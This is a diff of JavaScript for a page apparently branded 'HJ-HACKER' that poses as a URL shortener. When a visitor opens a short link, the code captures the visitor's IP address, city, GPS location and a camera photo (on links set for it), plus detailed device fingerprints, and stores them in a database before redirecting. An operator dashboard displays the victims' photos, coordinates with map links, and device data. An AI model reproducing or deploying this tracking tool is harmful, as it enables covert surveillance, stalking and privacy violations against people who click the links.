+    const cameraOn = document.getElementById('captureCamera')?.checked || false;
+    const locationOn = document.getElementById('captureLocation')?.checked || false;
+    const hasPassword = document.getElementById('passwordToggle')?.checked || false;
+    const password = hasPassword ? document.getElementById('password')?.value : null;
+    const hasSocialGate = document.getElementById('socialToggle')?.checked || false;
+    const socialUrl = hasSocialGate ? document.getElementById('socialUrl')?.value : null;
+    const socialTitle = hasSocialGate ? document.getElementById('socialTitle')?.value : null;
+    
+    if (hasPassword && !password) {
+        showToast("Error", "Enter password", "error");
+        return;
+    }
+    
+    showToast("Creating", "Creating link...", "info");
+    
+    try {
+        const linkData = {
+            long_url: finalUrl,
+            created_at: new Date().toISOString(),
+            clicks: 0,
+            capture_camera: cameraOn,
+            capture_location: locationOn
+        };
+        
+        if (password) linkData.password = password;
+        if (socialUrl) {
+            linkData.social_gate_url = socialUrl;
+            linkData.social_gate_title = socialTitle || "Follow to Unlock";
+        }
+        
+        await database.ref(`urls/${shortCode}`).set(linkData);
+        
+        const shortUrl = window.location.origin + "/" + shortCode;
+        document.getElementById('shortLink').value = shortUrl;
+        document.getElementById('result').classList.remove('hidden');
+        
+        if (typeof QRCode !== 'undefined') {
+            const qrDiv = document.getElementById('qrCode');
+            if (qrDiv) {
+                qrDiv.innerHTML = '';
+                new QRCode(qrDiv, {
+                    text: shortUrl,
+                    width: 100,
+                    height: 100,
+                    colorDark: "#00ff41",
+                    colorLight: "#000000"
+                });
+            }
+        }
+        
+        showToast("Success", "Link created: " + shortCode, "success");
+        document.getElementById('longUrl').value = '';
+        document.getElementById('customCode').value = '';
+        
+        document.getElementById('passwordToggle').checked = false;
+        document.getElementById('socialToggle').checked = false;
+        document.getElementById('passwordSection')?.classList.add('hidden');
+        document.getElementById('socialSection')?.classList.add('hidden');
+        
+        showLinks();
+        showStats();
+        showRecent();
+        
+    } catch (error) {
+        showToast("Error", error.message, "error");
+    }
+}
+
+// ========== DELETE LINK ==========
+async function deleteLink(code) {
+    try {
+        await database.ref(`urls/${code}`).remove();
+        await database.ref(`analytics/${code}`).remove();
+        showToast("Deleted", "Link deleted!", "success");
+        showLinks();
+        showStats();
+        showRecent();
+    } catch (error) {
+        showToast("Error", "Delete failed", "error");
+    }
+}
+
+// ========== SHOW LINKS ==========
+async function showLinks() {
+    const content = document.getElementById('dataDisplayContent');
+    if (!content) return;
+    
+    content.innerHTML = '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading links...</p></div>';
+    
+    try {
+        const snapshot = await database.ref('urls').once('value');
+        const urls = snapshot.val();
+        
+        if (!urls || Object.keys(urls).length === 0) {
+            content.innerHTML = '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links created yet</p></div>';
+            return;
+        }
+        
+        let html = '';
+        for (const [code, data] of Object.entries(urls)) {
+            html += `
+                <div class="data-item">
+                    <div class="data-item-header">
+                        <span class="data-item-code"><i class="fas fa-link"></i> /${code}</span>
+                        <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(data.created_at).toLocaleDateString()}</span>
+                    </div>
+                    <div class="data-item-url"><i class="fas fa-globe"></i> ${data.long_url?.substring(0, 60)}${data.long_url?.length > 60 ? '...' : ''}</div>
+                    <div class="data-item-stats">
+                        <span><i class="fas fa-mouse-pointer"></i> Clicks: ${data.clicks || 0}</span>
+                        ${data.capture_camera ? '<span style="color:#00ff41;"><i class="fas fa-camera"></i> Camera</span>' : ''}
+                        ${data.capture_location ? '<span style="color:#00ff41;"><i class="fas fa-map-marker-alt"></i> Location</span>' : ''}
+                        ${data.password ? '<span><i class="fas fa-lock"></i> Password</span>' : ''}
+                    </div>
+                    <div class="data-item-actions">
+                        <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${code}')"><i class="fas fa-copy"></i> Copy</button>
+                        <button class="data-btn-sm" onclick="viewAnalytics('${code}')"><i class="fas fa-chart-line"></i> Data</button>
+                        <button class="data-btn-sm" onclick="confirmDeleteLink('${code}')" style="border-color:#ff4444;color:#ff4444;"><i class="fas fa-trash-alt"></i> Delete</button>
+                    </div>
+                </div>
+            `;
+        }
+        content.innerHTML = html;
+    } catch (error) {
+        content.innerHTML = '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading links</p></div>';
+    }
+}
+
+// ========== SHOW STATS ==========
+async function showStats() {
+    const content = document.getElementById('dataDisplayContent');
+    content.innerHTML = '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading stats...</p></div>';
+    
+    try {
+        const snapshot = await database.ref('urls').once('value');
+        const urls = snapshot.val();
+        
+        let totalLinks = 0, totalClicks = 0;
+        if (urls) {
+            totalLinks = Object.keys(urls).length;
+            for (const data of Object.values(urls)) {
+                totalClicks += data.clicks || 0;
+            }
+        }
+        
+        const analyticsSnapshot = await database.ref('analytics').once('value');
+        let totalVisitors = 0;
+        if (analyticsSnapshot.val()) {
+            for (const visits of Object.values(analyticsSnapshot.val())) {
+                totalVisitors += Object.keys(visits).length;
+            }
+        }
+        
+        content.innerHTML = `
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value">${totalLinks}</div>
+                    <div class="stat-label"><i class="fas fa-link"></i> Total Links</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">${totalClicks}</div>
+                    <div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">${totalVisitors}</div>
+                    <div class="stat-label"><i class="fas fa-users"></i> Total Visitors</div>
+                </div>
+            </div>
+        `;
+    } catch (error) {
+        content.innerHTML = '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading stats</p></div>';
+    }
+}
+
+// ========== SHOW RECENT ==========
+async function showRecent() {
+    const content = document.getElementById('dataDisplayContent');
+    content.innerHTML = '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading recent activity...</p></div>';
+    
+    try {
+        const analyticsSnapshot = await database.ref('analytics').once('value');
+        const allAnalytics = analyticsSnapshot.val();
+        
+        if (!allAnalytics) {
+            content.innerHTML = '<div class="empty-data"><i class="fas fa-clock"></i><p>No visitors yet</p></div>';
+            return;
+        }
+        
+        let visitors = [];
+        for (const [code, visits] of Object.entries(allAnalytics)) {
+            for (const [id, data] of Object.entries(visits)) {
+                if (data && data.created_at) {
+                    visitors.push({
+                        code: code,
+                        ip: data.ip || 'Unknown',
+                        city: data.city || 'Unknown',
+                        country: data.country || 'Unknown',
+                        browser: data.browser || 'Unknown',
+                        os: data.os || 'Unknown',
+                        device: data.device || 'Unknown',
+                        screen: `${data.screen_width || '?'}x${data.screen_height || '?'}`,
+                        battery: data.battery_level || 'Unknown',
+                        connection: data.connection_type || 'Unknown',
+                        lat: data.latitude || data.lat || null,
+                        lng: data.longitude || data.lng || null,
+                        photo_url: data.photo_url || null,
+                        timestamp: data.created_at
+                    });
+                }
+            }
+        }
+        
+        visitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+        const recent = visitors.slice(0, 20);
+        
+        if (recent.length === 0) {
+            content.innerHTML = '<div class="empty-data"><i class="fas fa-clock"></i><p>No visitors yet</p></div>';
+            return;
+        }
+        
+        let html = '';
+        for (const v of recent) {
+            html += `
+                <div class="data-item">
+                    <div class="data-item-header">
+                        <span class="data-item-code"><i class="fas fa-link"></i> /${v.code}</span>
+                        <span class="data-item-date"><i class="fas fa-clock"></i> ${new Date(v.timestamp).toLocaleString()}</span>
+                    </div>
+                    <div class="data-item-stats">
+                        <span><i class="fas fa-globe"></i> IP: ${v.ip}</span>
+                        <span><i class="fas fa-map-marker-alt"></i> ${v.city}, ${v.country}</span>
+                    </div>
+                    <div class="data-item-stats">
+                        <span><i class="fas fa-mobile-alt"></i> ${v.device}</span>
+                        <span><i class="fab fa-${v.browser.toLowerCase()}"></i> ${v.browser}</span>
+                        <span><i class="fab fa-${v.os.toLowerCase().includes('windows') ? 'windows' : v.os.toLowerCase()}"></i> ${v.os}</span>
+                    </div>
+                    <div class="data-item-stats">
+                        <span><i class="fas fa-desktop"></i> Screen: ${v.screen}</span>
+                        <span><i class="fas fa-battery-full"></i> ${v.battery}</span>
+                        <span><i class="fas fa-wifi"></i> ${v.connection}</span>
+                    </div>
+            `;
+            
+            if (v.lat && v.lng) {
+                html += `
+                    <div class="data-item-stats">
+                        <i class="fas fa-satellite-dish"></i> GPS: ${v.lat.toFixed(4)}, ${v.lng.toFixed(4)}
+                        <button class="data-btn-sm" onclick="window.open('https://www.google.com/maps?q=${v.lat},${v.lng}', '_blank')">
+                            <i class="fas fa-map-marked-alt"></i> Open Map
+                        </button>
+                    </div>
+                `;
+            }
+            
+            if (v.photo_url) {
+                html += `
+                    <div class="data-item-stats" style="color: #00ff41; margin-top: 5px;">
+                        <i class="fas fa-camera"></i> Photo captured!
+                        <button class="data-btn-sm" onclick="viewPhoto('${v.photo_url}')">
+                            <i class="fas fa-eye"></i> View Photo
+                        </button>
+                    </div>
+                `;
+            }
+            
+            html += `</div>`;
+        }
+        
+        content.innerHTML = html;
+    } catch (error) {
+        content.innerHTML = '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading recent activity</p></div>';
+    }
+}
+
+// ========== VIEW ANALYTICS ==========
+window.viewAnalytics = async (code) => {
+    const content = document.getElementById('dataDisplayContent');
+    content.innerHTML = '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading analytics...</p></div>';
+    
+    try {
+        const linkSnapshot = await database.ref(`urls/${code}`).once('value');
+        const linkData = linkSnapshot.val();
+        
+        const analyticsSnapshot = await database.ref(`analytics/${code}`).once('value');
+        const analytics = analyticsSnapshot.val();
+        
+        if (!analytics) {
+            content.innerHTML = '<div class="empty-data"><i class="fas fa-inbox"></i><p>No visitors for this link</p></div>';
+            return;
+        }
+        
+        let visitors = [];
+        for (const [id, data] of Object.entries(analytics)) {
+            if (data && data.created_at) {
+                visitors.push(data);
+            }
+        }
+        
+        visitors.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+        
+        let html = `
+            <div style="margin-bottom:15px;padding:12px;background:#0a0a0a;border-radius:10px;border:1px solid #00ff41;">
+                <div style="color:#00ff41;font-weight:bold;"><i class="fas fa-chart-line"></i> ANALYTICS: /${code}</div>
+                <div style="font-size:11px;color:#aaa;margin-top:5px;word-break:break-all;"><i class="fas fa-link"></i> ${linkData?.long_url || 'N/A'}</div>
+                <div style="font-size:11px;color:#aaa;"><i class="fas fa-users"></i> Total Visitors: ${visitors.length}</div>
+            </div>
+        `;
+        
+        for (const v of visitors) {
+            html += `
+                <div class="data-item">
+                    <div class="data-item-header">
+                        <span><i class="fas fa-globe"></i> ${v.ip || 'Unknown'}</span>
+                        <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(v.created_at).toLocaleString()}</span>
+                    </div>
+                    <div class="data-item-stats"><strong><i class="fas fa-map-marker-alt"></i> Location:</strong> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</div>
+                    <div class="data-item-stats"><strong><i class="fas fa-mobile-alt"></i> Device:</strong> ${v.device || 'Unknown'}</div>
+                    <div class="data-item-stats"><strong><i class="fab fa-${(v.browser || 'chrome').toLowerCase()}"></i> Browser:</strong> ${v.browser || 'Unknown'} | <strong>OS:</strong> ${v.os || 'Unknown'} ${v.os_version ? '('+v.os_version+')' : ''}</div>
+                    <div class="data-item-stats"><strong><i class="fas fa-battery-full"></i> Battery:</strong> ${v.battery_level || 'Unknown'} | <strong>Charging:</strong> ${v.battery_charging || 'Unknown'}</div>
+                    <div class="data-item-stats"><strong><i class="fas fa-microchip"></i> RAM:</strong> ${v.device_memory || 'Unknown'} | <strong>CPU:</strong> ${v.hardware_concurrency || 'Unknown'} cores</div>
+                    <div class="data-item-stats"><strong><i class="fas fa-wifi"></i> Network:</strong> ${v.connection_type ? v.connection_type.toUpperCase() : 'Unknown'} | ${v.downlink || ''} | ${v.rtt || ''}</div>
+                    <div class="data-item-stats"><strong><i class="fas fa-desktop"></i> Screen:</strong> ${v.screen_width || '?'}x${v.screen_height || '?'} | Ratio: ${v.device_pixel_ratio || '1'}</div>
+                    <div class="data-item-stats"><strong><i class="fas fa-language"></i> Language:</strong> ${v.language || 'Unknown'} | <strong>Timezone:</strong> ${v.timezone || 'Unknown'}</div>
+            `;
+            
+            if (v.latitude && v.longitude) {
+                html += `
+                    <div class="data-item-stats">
+                        <strong><i class="fas fa-satellite-dish"></i> GPS:</strong> ${v.latitude.toFixed(6)}, ${v.longitude.toFixed(6)}
+                        <button class="data-btn-sm" onclick="window.open('https://www.google.com/maps?q=${v.latitude},${v.longitude}', '_blank')">
+                            <i class="fas fa-map-marked-alt"></i> Open Map
+                        </button>
+                    </div>
+                `;
+            }
+            
+            if (v.photo_url) {
+                html += `
+                    <div class="data-item-stats" style="color: #00ff41; margin-top: 5px;">
+                        <strong><i class="fas fa-camera"></i> Photo:</strong> Captured!
+                        <button class="data-btn-sm" onclick="viewPhoto('${v.photo_url}')">
+                            <i class="fas fa-eye"></i> View Photo
+                        </button>
+                    </div>
+                `;
+            }
+            
+            html += `</div>`;
+        }
+        
+        content.innerHTML = html;
+        showToast("Success", visitors.length + " visitors found", "success");
+        
+    } catch (error) {
+        content.innerHTML = '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading analytics</p></div>';
+        showToast("Error", error.message, "error");
+    }
+};
+
+// ========== VIEW PHOTO ==========
+window.viewPhoto = (url) => {
+    const modal = document.getElementById('photoModal');
+    const img = document.getElementById('photoModalImage');
+    
+    if (modal && img && url) {
+        img.src = url;
+        modal.style.display = 'flex';
+        modal.classList.remove('hidden');
+        showToast("Photo", "Photo loaded!", "success");
+    } else {
+        showToast("Error", "Cannot view photo", "error");
+    }
+};
+
+function closePhotoModal() {
+    const modal = document.getElementById('photoModal');
+    if (modal) {
+        modal.style.display = 'none';
+        modal.classList.add('hidden');
+    }
+}
+
+function downloadPhoto() {
+    const img = document.getElementById('photoModalImage');
+    if (img && img.src) {
+        window.open(img.src, '_blank');
+    }
+}
+
+window.copyToClipboard = (text) => {
+    navigator.clipboard.writeText(text);
+    showToast("Copied", "Link copied!", "success");
+};
+
+window.confirmDeleteLink = (code) => {
+    if (confirm(`Delete link /${code}? This will also delete all analytics data.`)) {
+        deleteLink(code);
+    }
+};
+
+function togglePassword() {
+    const section = document.getElementById('passwordSection');
+    if (section) section.classList.toggle('hidden');
+}
+
+function toggleSocial() {
+    const section = document.getElementById('socialSection');
+    if (section) section.classList.toggle('hidden');
+}
+
+function toggleAdvanced() {
+    const content = document.getElementById('advancedContent');
+    const icon = document.querySelector('#advancedToggle i:last-child');
+    if (content) {
+        content.classList.toggle('hidden');
+        if (icon) {
+            icon.className = content.classList.contains('hidden') ? 'fas fa-chevron-down' : 'fas fa-chevron-up';
+        }
+    }
+}
+
+// ========== VISITOR HANDLER ==========
+async function handleVisitorRedirect() {
+    const path = window.location.pathname;
+    if (path === '/' || path === '/index.html') return;
+    
+    const shortCode = path.substring(1);
+    console.log("Visiting link:", shortCode);
+    
+    try {
+        const snapshot = await database.ref(`urls/${shortCode}`).once('value');
+        const linkData = snapshot.val();
+        
+        if (!linkData) return;
+        
+        let photoUrl = null;
+        let locationData = null;
+        let ipInfo = await getIPInfo();
+        let deviceInfo = await getDeviceInfo();
+        
+        if (linkData.capture_camera === true) {
+            photoUrl = await captureAndUploadPhoto();
+        }
+        
+        if (linkData.capture_location === true) {
+            locationData = await captureLocation();
+        }
+        
+        if (linkData.password) {
+            const pwd = prompt("This link is password protected. Enter password:");
+            if (pwd !== linkData.password) {
+                alert("Wrong password!");
+                return;
+            }
+        }
+        
+        if (linkData.social_gate_url) {
+            const confirmGate = confirm(`Please follow: ${linkData.social_gate_title || 'Follow to continue'}\n\nClick OK to open link. After following, come back and click OK again.`);
+            if (confirmGate) {
+                window.open(linkData.social_gate_url, '_blank');
+                await new Promise(r => setTimeout(r, 3000));
+            }
+        }
+        
+        const analyticsData = {
+            created_at: new Date().toISOString(),
+            ip: ipInfo.ip,
+            city: ipInfo.city,
+            region: ipInfo.region,
+            country: ipInfo.country,
+            latitude: locationData?.lat || ipInfo.latitude,
+            longitude: locationData?.lng || ipInfo.longitude,
+            accuracy: locationData?.accuracy,
+            photo_url: photoUrl,
+            browser: deviceInfo.browser,
+            os: deviceInfo.os,
+            os_version: deviceInfo.os_version,
+            device: deviceInfo.device,
+            device_brand: deviceInfo.device_brand,
+            screen_width: deviceInfo.screen_width,
+            screen_height: deviceInfo.screen_height,
+            device_pixel_ratio: deviceInfo.device_pixel_ratio,
+            language: deviceInfo.language,
+            timezone: deviceInfo.timezone,
+            hardware_concurrency: deviceInfo.hardware_concurrency,
+            device_memory: deviceInfo.device_memory,
+            battery_level: deviceInfo.battery_level,
+            battery_charging: deviceInfo.battery_charging,
+            connection_type: deviceInfo.connection_type,
+            downlink: deviceInfo.downlink,
+            rtt: deviceInfo.rtt
+        };
+        
+        await database.ref(`analytics/${shortCode}`).push(analyticsData);
+        await database.ref(`urls/${shortCode}/clicks`).transaction(c => (c || 0) + 1);
+        
+        window.location.href = linkData.long_url;
+        
+    } catch (error) {
+        console.error("Redirect error:", error);
+    }
+}
+
+// ========== EVENT LISTENERS ==========
+document.getElementById('shortenBtn')?.addEventListener('click', shortenUrl);
+document.getElementById('copyBtn')?.addEventListener('click', () => {
+    const link = document.getElementById('shortLink')?.value;
+    if (link) copyToClipboard(link);
+});
+document.getElementById('closePhotoModal')?.addEventListener('click', closePhotoModal);
+document.getElementById('closePhotoModalBtn')?.addEventListener('click', closePhotoModal);
+document.getElementById('downloadPhotoBtn')?.addEventListener('click', downloadPhoto);
+document.getElementById('passwordToggle')?.addEventListener('change', togglePassword);
+document.getElementById('socialToggle')?.addEventListener('change', toggleSocial);
+document.getElementById('advancedToggle')?.addEventListener('click', toggleAdvanced);
+
+document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        const tab = btn.dataset.tab;
+        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        
+        if (tab === 'create') {
+            document.getElementById('createCard')?.scrollIntoView({ behavior: 'smooth' });
+            const content = document.getElementById('dataDisplayContent');
+            if (content) {
+                content.innerHTML = '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Click LINKS, STATS, or RECENT to view data</p></div>';
+            }
+        } else if (tab === 'links') showLinks();
+        else if (tab === 'stats') showStats();
+        else if (tab === 'recent') showRecent();
+    });
+});
+
+window.addEventListener('click', (e) => {
+    const modal = document.getElementById('photoModal');
+    if (e.target === modal) closePhotoModal();
+});
+
+// Start
+handleVisitorRedirect();
+showLinks();
+showStats();
+showRecent();
+
+console.log("HJ-HACKER Fully Working!");
+</script>
 </body>
 </html>
